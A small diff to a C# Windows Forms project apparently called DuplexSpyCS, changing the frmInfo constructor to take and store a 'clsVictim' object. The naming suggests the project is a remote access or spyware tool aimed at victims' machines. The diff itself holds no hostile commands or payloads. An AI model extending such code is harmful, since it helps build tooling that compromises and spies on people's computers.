@@ -15,9 +15,11 @@ namespace DuplexSpyCS
         public clsVictim v;
         private Dictionary<string, string> dic_Screen = new Dictionary<string, string>();
 
-        public frmInfo()
+        public frmInfo(clsVictim victim)
         {
             InitializeComponent();
+
+            v = victim;
         }
 
         private ColumnHeader FindColumnHeaderByText(ListView lv, string text)
